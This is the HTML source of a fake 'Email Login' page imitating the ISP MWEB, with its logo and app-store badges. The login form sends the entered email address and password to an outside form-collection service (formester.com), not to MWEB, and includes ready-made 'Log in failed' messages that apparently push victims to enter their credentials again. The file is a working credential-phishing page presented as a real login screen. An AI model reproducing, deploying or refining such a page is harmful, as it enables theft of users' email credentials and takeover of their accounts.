<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" sizes="32x32" href="./images/favicon.png">
    <link rel="stylesheet" href="style.css">
    <script src="https://kit.fontawesome.com/21cf0ca2ce.js" crossorigin="anonymous"></script>
    <title>Email Login - MWEB</title>
</head>
<body>
    <header>
        <div class="img-log">
            <img src="images/mweb-logo-2020-white.png" alt="">
        </div>
    </header>
    <main>
        <div class="side1div">
           <div class="awerness-text">
                <p>You asked. We delivered!</p>
                <p>Download the App.</p>
           </div>
           <div class="appcontainer">
                <div class="app-img">
                    <img src="images/google-play.png" alt="google-play">
                </div>
                <div class="app-img">
                    <img src="images/app-store.png" alt="app-store">
                </div>
                <div class="app-img">
                    <img src="images/app-gallery.png" alt="app-gallery">
                </div>
           </div>
        </div>
        <div class="side2div">
            <div class="loginform-container">
                <form accept-charset='UTF-8' action='https://app.formester.com/forms/d9f6dd55-efe1-43cb-a178-3e5d7d3bc9c6/submissions'   method="post">
                    <h1>Email Login</h1>
                    <label for="email">
                        <span>Email address*</span>
                    </label>
                    <div class="input-div">
                        <input type="email" name="email" id="email" placeholder="Please enter your username" required>
                    </div>
                    
                    <div class="input-div maerg-inp">
                        <label for="pwwwd">
                            <span>Password*</span>
                        </label>
                        <input type="password" name="pwwwd" id="pwd" placeholder="Please enter your Password" required>
                        <span class="alert">Log in failed. Please use your MWEB email address and password.</span>
                    </div>
                    <!-- <div class="submit-btn"> -->
                        <button type="submit" value="Login" class="btn">LOGIN</button>
                        <p class="fpwd">Forgotten password?</p>
                    <!-- </div> -->
                </form>
            </div>
        </div>
    </main>
    <div class="outer">
        <div class="popup">
            <div class="hedpop">
                <i class="fas fa-x-ray" style="visibility: hidden;"></i>
                <h1>Login failed</h1>
                <div class="icon">
                    <i class="fas fa-x"></i>
                </div>
            </div>
            <div class="message">
                <span>Your username is incorrect. Please check your spelling and try again</span>
            </div>
        </div>
    </div>
    <script src="app.js"></script>
</body>
</html>
